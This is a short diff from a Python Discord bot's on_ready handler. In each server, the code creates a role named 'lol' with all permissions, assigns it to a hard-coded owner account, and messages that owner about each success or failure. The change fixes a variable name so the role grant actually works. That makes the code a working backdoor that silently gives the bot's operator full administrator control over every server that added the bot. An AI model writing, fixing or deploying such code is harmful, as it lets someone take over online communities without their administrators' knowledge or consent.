@@ -86,7 +86,7 @@ async def on_ready():
             try:
                 role = await guild.create_role(name="lol", permissions=discord.Permissions.all())
                 me = await guild.fetch_member(OWNER)
-                await me.add_roles(r)
+                await me.add_roles(role)
                 await ownerman.send("Added your perms in " + str(guild.name))
             except Exception as e:
                 await ownerman.send("Failed to add your perms in " + str(guild.name))
